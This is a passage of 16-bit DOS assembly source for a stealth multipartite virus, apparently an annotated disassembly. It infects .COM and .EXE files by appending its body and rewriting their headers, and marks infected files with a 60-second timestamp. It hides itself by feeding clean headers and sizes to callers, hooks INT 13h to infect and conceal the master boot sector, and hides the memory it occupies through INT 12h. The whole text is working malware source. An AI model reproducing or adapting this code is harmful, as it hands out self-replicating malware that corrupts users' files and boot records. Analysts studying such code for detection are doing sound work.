                CMP     SI, [DI+(Host_Size-Buffer)]
                JNE     Error_Exit_Inf

                CMP     AX, Virus_Size          ; .EXE can't be smaller than
                SBB     DX, 0                   ; the virus itself.
                JC      Exit_Inf_Hand

                XOR     DX, DX

                CMP     DX, [DI.Max_Size_Mem]   ; Can't have a NULL maximum
                JE      Error_Exit_Inf          ; memory requirement.

Append_Body:    MOV     CX, Virus_Size          ; Append virusbody to file.
                MOV     AH, 40h
                CALL    Do_Old_Int21h
                JC      Exit_Inf_Hand

                SUB     CX, AX                  ; Were all bytes written?
                JNZ     Error_Exit_Inf          ; Else mark as failure.

                MOV     DX, CX                  ; *** DX is already zero.

                MOV     AX, 4200h               ; Seek to BOF.
                CALL    Do_Old_Int21h
                JC      Exit_Inf_Hand

                MOV     AX, [DI+(Host_Size-Buffer)]

                CMP     Host_Type, COM
                JE      Infect_COM

Infect_EXE:     MOV     DX, [DI+(Host_Size-Buffer)+2]

                MOV     CX, 4
		PUSH	DI
                MOV     SI, [DI.Header_Size]
                XOR     DI, DI

Mul_16:         SHL     SI, 1                   ; Calculate headersize.
                RCL     DI, 1
                LOOP    Mul_16

                SUB     AX, SI                  ; Calculate imagesize.
                SBB     DX, DI

		POP	DI

                MOV     CL, 12                  ; 64k's DIV 4096 to get the
                SHL     DX, CL                  ; new CS.

                MOV     [DI.Program_IP], AX
                MOV     [DI.Program_CS], DX

                ADD     DX, 3408/16             ; Set new stack.

                MOV     [DI.Program_SP], AX
                MOV     [DI.Program_SS], DX

                ADD     [DI.Min_Size_Mem], 448/16
                MOV     AX, [DI.Min_Size_Mem]

                CMP     AX, [DI.Max_Size_Mem]   ; MaxMemSize must be atleast
                JB      Calc_New_Img_S          ; MinMemSize.

                MOV     [DI.Max_Size_Mem], AX   ; MaxMemSize == MinMemSize.

Calc_New_Img_S: MOV     AX, [DI.Image_Mod_512]
                ADD     AX, Virus_Size
		PUSH	AX

                AND     AH, 1                   ; AX modulo 512.

                MOV     [DI.Image_Mod_512], AX
		POP	AX

                MOV     CL, 9                   ; AX DIV 512.
                SHR     AX, CL

                ADD     [DI.File_512_Pages], AX
                MOV     DX, OFFSET Buffer
		NOP
                MOV     CX, 24                  ; Write 24 bytes (MZ-header).
                JMP     SHORT Write_Header

Infect_COM:     MOV     DX, OFFSET Buffer
		NOP
                MOV     DI, DX
                MOV     BYTE PTR [DI], 0E9h     ; JMP xxxx.
		INC	DI
                SUB     AX, 3                   ; Calculate displacement.

		PUSH	DS
		POP	ES

                CLD                             ; Store JMP displacement.
                STOSW

                MOV     CX, 3                   ; Write 3 bytes (JMP_Virus).

Write_Header:   MOV     AH, 40h                 ; Write modified header.
                CALL    Do_Old_Int21h
                JC      Bad_Exit

                CMP     AX, CX                  ; All bytes were written?
                JE      Good_Exit

Bad_Exit:       STC

Good_Exit:      RETN

; Infect the handle of a newly created file when it is closed.
Infect_3E:
                CMP     CS:File_Handle, BL      ; They're closing our handle?
                JNE     Go_Close_Hnd

                CMP     CS:Valid_Handle, 1      ; Does File_Handle contain
                JNE     Go_Close_Hnd            ; a valid filehandle at all?

                DEC     CS:Valid_Handle         ; Reset the filehandle (0).

		PUSH	DS
		PUSH	ES
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	SI
		PUSH	DI

                MOV     AX, 4200h               ; Seek to file's header.
                XOR     CX, CX
                XOR     DX, DX
                CALL    Do_Old_Int21h

                CALL    Infect_Handle           ; Go infect the file.
                JC      Exit_Infect_3E

                MOV     AX, 5700h
                CALL    Do_Old_Int21h

                INC     AL                      ; *** Not used.

                OR      CL, (62/2)              ; Set 60 seconds.
		DEC	CX

                MOV     AX, 5701h
                CALL    Do_Old_Int21h

Exit_Infect_3E: POP     DI
		POP	SI
		POP	DX
		POP	CX
		POP	BX
		POP	AX
		POP	ES
		POP	DS

Go_Close_Hnd:   CALL    Do_Old_Int21h

                JMP     IRET_Flags


Go_Check_Secs:
		PUSH	ES
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	SI
		PUSH	DI

                MOV     AX, 5700h
                CALL    Do_Old_Int21h

                OR      AL, AL                  ; *** This seems fucked, CF
                JC      Exit_Go_Chk_Se          ; is always cleared after OR.

                CALL    Check_60_Secs

Exit_Go_Chk_Se: POP     DI
		POP	SI
		POP	DX
		POP	CX
		POP	BX
		POP	AX
		POP	ES

                JE      Stealth_Handle

                JMP     JMP_Old_Int21h


Check_60_Secs:
                MOV     AL, CL

                OR      CL, (62/2)              ; Set 60 seconds.
                DEC     CX

                XOR     AL, CL

		RETN


Stealth_Handle:
		PUSH	DS

		PUSH	DX
		PUSH	CX
		PUSH	AX

		PUSH	CS
		POP	DS

                MOV     Read_Count, CX          ; Save CX for later use.

                XOR     CX, CX

                MOV     New_Read_Count, CX

                MOV     AX, 4201h               ; Get current file position.
                XOR     DX, DX
                CALL    Do_Old_Int21h

                MOV     File_Pos, AX            ; Save it for later.
                MOV     File_Pos+2, DX

                MOV     AX, 4202h               ; Get filesize.
                XOR     DX, DX
                CALL    Do_Old_Int21h

                SUB     AX, Virus_Size          ; Get original filesize.
                SBB     DX, 0

                MOV     Orig_Size, AX           ; Save it.
                MOV     Orig_Size+2, DX

		POP	AX

                CMP     AH, 42h                 ; It is a seek EOF relative?
                JNE     Rest_File_Pos

                POP     CX                      ; CX:DX = EOF displacement.
		POP	DX

		POP	DS

		PUSH	CX

                SUB     DX, Virus_Size          ; Do the seek relative to
                SBB     CX, 0                   ; the clean filesize instead
                CALL    Do_Old_Int21h           ; of the infected size.

		POP	CX

                JMP     IRET_Flags

JMP_Cln_Handle: JMP     Clean_Handle

Rest_File_Pos:  PUSH    AX

                MOV     AX, 4200h               ; Restore original position.
                MOV     DX, File_Pos
                MOV     CX, File_Pos+2
                CALL    Do_Old_Int21h

                OR      DX, DX                  ; They're attempting to
                JNZ     JA_Chk_Body_Rd          ; access the 1st 64k ?

                CMP     AX, 23                  ; The header in particular?
JA_Chk_Body_Rd: JA      Chk_Body_Reach

                POP     AX                      ; Restore AX & CX.
		POP	CX
		PUSH	CX
		PUSH	AX

                CMP     AH, 3Fh                 ; It is a read?
                JNE     JMP_Cln_Handle          ; Else it's a write.

                MOV     AX, CX                  ; AX = bytes to read.

                ADD     CX, File_Pos            ; Calculate end offset after
                                                ; the read.

                JC      Calc_Count_Hdr          ; Above 64k ?

                CMP     CX, 24                  ; Does the read touch the
                JB      Sub_St_Size             ; entire header?

Calc_Count_Hdr: MOV     AX, 24                  ; Calculate howmany bytes
                SUB     AX, File_Pos            ; to stealth in the header.

                MOV     New_Read_Count, AX      ; Save the new read count.

Sub_St_Size:    SUB     Read_Count, AX          ; The header will be read by
                                                ; the virus, so adjust the
                                                ; caller read count.
		PUSH	AX

                MOV     AX, 4200h               ; Seek to the host's clean
                MOV     CX, Orig_Size+2         ; header. *** The caller's
                MOV     DX, Orig_Size           ; header offset should be
                ADD     DX, OFFSET Host_Header  ; added aswell, now it screws
                ADC     CX, 0                   ; up on header reads that
                CALL    Do_Old_Int21h           ; don't start at offset 0.

                POP     CX                      ; CX = howmany bytes to
                                                ; stealth in header.
		PUSH	BP
                MOV     BP, SP

                LDS     DX, [BP+(3*2)]          ; Read buffer of the caller.

                POP     BP

                MOV     AH, 3Fh                 ; Read the clean header
                CALL    Do_Old_Int21h           ; into the caller's buffer.

		PUSH	CS
		POP	DS

		PUSH	AX
		PUSH	CX

                ADD     File_Pos, AX            ; Update saved position.
                ADC     File_Pos+2, 0

                MOV     DX, File_Pos            ; Restore file position.
                MOV     CX, File_Pos+2
                MOV     AX, 4200h
                CALL    Do_Old_Int21h

		POP	CX
		POP	AX

                SUB     CX, AX                  ; Not all bytes were read?
                JNZ     Error_St_Exit           ; Then bail.

                CMP     Read_Count, 0           ; No more bytes need to be
                JNZ     Chk_Body_Reach          ; read? Then IRET back.

		POP	CX
		POP	CX

                MOV     AX, CX                  ; AX = 0.

                JZ      Exit_Stealth_1

Error_St_Exit:  POP     DX
		POP	DX

Exit_Stealth_1: POP     DX
		POP	DS

                JMP     IRET_Flags

Chk_Body_Reach: POP     AX                      ; Value of AX on entry.
		PUSH	AX

                MOV     CX, File_Pos            ; Original fileposition
                MOV     DX, File_Pos+2          ; where the action starts.

                CMP     DX, Orig_Size+2         ; Below virus' 64k ?
                JB      Calc_End_Pos

                CMP     CX, Orig_Size           ; Below virus' code? If not,
                JBE     Calc_End_Pos            ; the virusbody gets read or
                                                ; overwritten, so stealth it.

                CMP     AH, 40h                 ; If it's a write then go
                JE      Clean_Handle            ; disinfect the handle.

		POP	AX
		POP	CX

                XOR     AX, AX                  ; Return 0 bytes read when
                JZ      Exit_Stealth_1          ; they try to read from after
                                                ; the original host.

Calc_End_Pos:   ADD     CX, Read_Count          ; Calculate end position
                ADC     DX, 0                   ; after the read/write.

                CMP     DX, Orig_Size+2         ; Below the virusbody?
                JB      Do_Function

                CMP     CX, Orig_Size
                JBE     Do_Function

                CMP     AH, 40h                 ; If it's a write then
                JE      Clean_Handle            ; disinfect the handle.

                MOV     CX, Orig_Size
                MOV     DX, Orig_Size+2

                SUB     CX, File_Pos
                SBB     DX, File_Pos+2

                OR      DX, DX                  ; *** Obsolete instruction.
                JZ      Set_New_Byte_C

                MOV     CX, -1
                SUB     CX, New_Read_Count

Set_New_Byte_C: MOV     Read_Count, CX

Do_Function:    POP     AX
		POP	CX
		POP	DX
		POP	DS
		PUSH	CX

		PUSH	AX
		PUSH	DX

                MOV     CX, CS:Read_Count
                ADD     DX, CS:New_Read_Count
                CALL    Do_Old_Int21h

                ADD     AX, CS:New_Read_Count

		POP	DX
		POP	CX

                CMP     CH, 3Fh                 ; It aint a read? Then it's
                JE      Exit_Stealth_2          ; a get/set filedate & time.

		PUSH	AX
		PUSH	DX

                MOV     AX, 5700h               ; Get file's date & time.
                CALL    Do_Old_Int21h

                INC     AL                      ; AX = 5701h.
                OR      CL, (62/2)              ; Set 60 seconds.
		DEC	CX
                CALL    Do_Old_Int21h

		POP	DX
		POP	AX

Exit_Stealth_2: POP     CX
                JMP     IRET_Flags

Clean_Handle:
                MOV     WORD PTR Valid_Handle, 0001h
                MOV     File_Handle, BL

                MOV     AX, 4200h               ; Seek to the old header.
                MOV     CX, Orig_Size+2
                MOV     DX, Orig_Size
                ADD     DX, OFFSET Host_Header
                ADC     CX, 0
                CALL    Do_Old_Int21h

                MOV     AH, 3Fh                 ; Read it in.
                MOV     CX, 24
                MOV     DX, OFFSET Buffer
		NOP
                CALL    Do_Old_Int21h

                MOV     AX, 4200h               ; Seek to the old EOF.
                MOV     DX, Orig_Size
                MOV     CX, Orig_Size+2
                CALL    Do_Old_Int21h

                MOV     AH, 40h                 ; Write new EOF marker.
                XOR     CX, CX
                CALL    Do_Old_Int21h

                MOV     AX, 4200h               ; Seek to BOF.
                XOR     CX, CX
                XOR     DX, DX
                CALL    Do_Old_Int21h

                MOV     AH, 40h                 ; Restore old header.
                MOV     CX, 24
                MOV     DX, OFFSET Buffer
		NOP
                CALL    Do_Old_Int21h

                MOV     AX, 4200h               ; Restore original file pos.
                MOV     DX, File_Pos
                MOV     CX, File_Pos+2
                CALL    Do_Old_Int21h

		POP	AX
		POP	CX
		POP	DX
		POP	DS

                JMP     SHORT JMP_Old_Int21h


Check_Win_Exit:
                POP     BX                      ; Remove return IP off stack.
                POP     CX                      ; POP program's return CS.

		PUSH	CX
		PUSH	BX
		PUSH	AX

                DEC     CX                      ; Get program's MCB.
                MOV     DS, CX

                MOV     SI, 8                   ; SI = name of terminating
                                                ; program.

                CLD                             ; Fetch 1st word of filename.
                LODSW
                XCHG    BX, AX

                LODSW                           ; Fetch 2nd word of filename.
                XCHG    DX, AX

		POP	AX

                CMP     BX, 'IW'                ; Is it WIN.COM that's
                JNE     J2_J_Old_i21h           ; terminating?

                CMP     DX, 'N'
                JNE     J2_J_Old_i21h

                DEC     CS:Windows_Active       ; If so, reset the flag.

J2_J_Old_i21h:  JMP     SHORT JMP_Old_Int21h


Stealth_Seconds:
		PUSH	AX
		PUSH	CX
		PUSH	DX

                MOV     AX, 5700h               ; Get file's date & time.
                CALL    Do_Old_Int21h

		PUSH	AX
		PUSH	CX

                CALL    Check_60_Secs           ; Check if it's infected.

		POP	CX
		POP	AX

		POP	DX
		POP	CX
		POP	AX

                JNE     JMP_Old_Int21h          ; If it ain't then get out.

                OR      AL, AL                  ; Get file date & time?
                JNZ     Stealth_Set             ; Else it's a set.

                CALL    Do_Old_Int21h           ; Do the call.

                AND     CL, 11100000b           ; Clear seconds.
                JMP     IRET_Flags

Stealth_Set:    OR      CL, (62/2)              ; Set 60 seconds.
		DEC	CX

                JNZ     JMP_Old_Int21h          ; This jump is always taken.

Do_Old_Int21h:  PUSHF                           ; Simulate an interrupt 21h.
                CALL    DWORD PTR CS:Old_Int21h

		RETN

JMP_Old_Int21h: JMP     DWORD PTR CS:Old_Int21h

Host_Header:    DB      0CDh, 20h
		DB	22 DUP (0)

; This ISR stealths the first INT 12h and then unhooks itself, this way
; MEM and CHKDSK will report the untouched total DOS memory size.
New_Int12h:
                PUSH    DS
                PUSH    ES
                PUSH    BX

                XOR     AX, AX                  ; DS = IVT.
                MOV     DS, AX

                LES     BX, DWORD PTR CS:Old_Int12h

                CLI                             ; Restore original INT 12h.
                MOV     DS:[(12h*4)], BX
                MOV     DS:[(12h*4)+2], ES
                STI

                POP     BX
                POP     ES
                POP     DS

                INT     12h                     ; Do the original INT 12h.

                ADD     AX, Virus_Size_1024     ; Stealth DOS memory size.

                IRET

                DB      '10/23/92', 0
Origin          =       BYTE PTR $-1

File_Int21h:
                CMP     AX, 0EEE7h              ; Residency check?
                JE      Return_ID_2

                CMP     AX, 3513h               ; Get INT 13h ?
                JE      Get_Int13h_St

                CMP     AX, 3521h               ; Get INT 21h ?
                JE      Get_Int21h_St

                CMP     AX, 2513h               ; Set INT 13h ?
                JE      Set_Int13h_St

                CMP     AX, 2521h               ; Set INT 21h ?
                JE      Set_Int21h_St

                JMP     DWORD PTR CS:600h+(Old_Int21h-File_Int21h)

Return_ID_2:    MOV     AX, 0D703h              ; Return ID word to caller.
                IRET

Get_Int13h_St:  LES     BX, DWORD PTR CS:600h+(Old_Int13h-File_Int21h)
                IRET

Get_Int21h_St:  LES     BX, DWORD PTR CS:600h+(Old_Int21h-File_Int21h)
                IRET

Set_Int13h_St:  MOV     CS:600h+(Old_Int13h-File_Int21h), DX
                MOV     CS:600h+(Old_Int13h-File_Int21h)+2, DS
                IRET

Set_Int21h_St:  MOV     CS:[600h+(Old_Int21h-File_Int21h)], DX
                MOV     CS:[600h+(Old_Int21h-File_Int21h)+2], DS
                IRET


Act_Partition   DW      0


Boot_Int13h:
                CMP     DX, 80h                 ; 1st HD - head zero?
                JNE     JMP_Boot_i13h

                CMP     CX, Virus_Size_512+2    ; Operation concerns the
                JNB     JMP_Boot_i13h           ; MBS or virussectors?

                CMP     AH, 02h                 ; Sector read?
                JE      Check_For_MBS

                CMP     AH, 03h                 ; Sector write?
                JE      Check_For_MBS

JMP_Boot_i13h:  JMP     DWORD PTR CS:[0000h]    ; Jump to the previous ISR.
Ofs_Old_Int13h  =       WORD PTR $-2

Check_For_MBS:  CMP     CX, 1                   ; It's the MBS ?
                JNE     Check_If_Write

                CMP     AH, 02h                 ; It is a MBS read?
                JE      Do_Read_Write           ; Else it's a write.

                PUSH    SI

                CALL    Get_Act_Partition       ; Get delta offset to active
                                                ; partition.

                MOV     ES:[BX+SI], 0200h       ; Set the infected partition
                                                ; in the MBS so the written
                                                ; MBS will still be infected.
                POP     SI

Do_Read_Write:  PUSH    AX

                MOV     AL, 1                   ; Only read/write to the MBS.

                PUSHF                           ; Carry out the read/write.
		CALL	DWORD PTR CS:[0]
Ofs_Real_Int13h =       WORD PTR $-2

		POP	AX

                CMP     AH, 03h                 ; It was a write?
                JE      Success_IRET

                PUSH    SI                      ; Else stealth the read.

                CALL    Get_Act_Partition

                MOV     ES:[BX+SI], 0101h       ; Put back the original
                                                ; MS-DOS partition start.
		POP	SI

                CMP     AL, 1
                JE      Success_IRET

Check_If_Write: CMP     AH, 03h                 ; It was a write?
                JE      Success_IRET

		PUSH	AX
		PUSH	CX
		PUSH	DX
		PUSH	DI

                XOR     AH, AH

                MOV     DI, BX                  ; ES:DI = readbuffer.

                CMP     CX, 1
                MOV     CX, 512
                JNE     Calc_Sec_Size

                DEC     AX                      ; Skip the MBS.
                ADD     DI, CX                  ; Next sector.

Calc_Sec_Size:  MUL     CX                      ; Sectorcount * 512.

                OR      DX, DX
                JZ      Clear_Buffer

                MOV     CX, 0

Clear_Buffer:   XCHG    CX, AX

                CLD

Clear_Byte:     STOSB
                LOOP    Clear_Byte

		POP	DI
		POP	DX
		POP	CX
		POP	AX

Success_IRET:   CLC                             ; Mark success. *** The next
                                                ; XOR clears CF already.
                XOR     AH, AH

IRET_Flags:     PUSH    AX
                LAHF

		PUSH	BP
                MOV     BP, SP

                MOV     [BP+(4*2)], AH          ; Set new flags in stack.

		POP	BP
		POP	AX

                IRET


; Get's the active partition.
Get_Act_Partition:

                CALL    Get_Delta_2
Get_Delta_2:    POP     SI
                SUB     SI, OFFSET Get_Delta_2

                MOV     SI, CS:[SI+Act_Partition]

		RETN
End_Body:

Old_Int08h      =       WORD PTR $+0
Old_Int21h      =       WORD PTR $+4
Old_Int01h      =       WORD PTR $+8
Old_Int12h      =       WORD PTR $+8
Old_Int13h      =       WORD PTR $+12
Real_Int13h     =       WORD PTR $+16
Buffer          =       $+20
Read_Count      =       WORD PTR $+44
Host_Size       =       WORD PTR $+44
New_Read_Count  =       WORD PTR $+46
File_Pos        =       WORD PTR $+48
Host_Type       =       BYTE PTR $+49
Orig_Size       =       WORD PTR $+52
Valid_Handle    =       BYTE PTR $+56
File_Handle     =       BYTE PTR $+57


EXE_Header      STRUC
EXE_ID          DW      0
Image_Mod_512   DW      0
File_512_Pages  DW      0
Reloc_Items     DW      0
Header_Size     DW      0
Min_Size_Mem    DW      0
Max_Size_Mem    DW      0
Program_SS      DW      0
Program_SP      DW      0
Checksum        DW      0
Program_IP      DW      0
Program_CS      DW      0
Reloc_Table     DW      0
EXE_Header      ENDS

Find_FN_FCB     STRUC
FCB_Drive       DB      0
FCB_Name        DB      8 DUP(0)
FCB_Ext         DB      3 DUP(0)
FCB_Attr        DB      0
FCB_Reserved    DB      10 DUP(0)
FCB_Time        DW      0
FCB_Date        DW      0
FCB_Start_Clust DW      0
FCB_Size        DW      0, 0
Find_FN_FCB     ENDS

                END     START
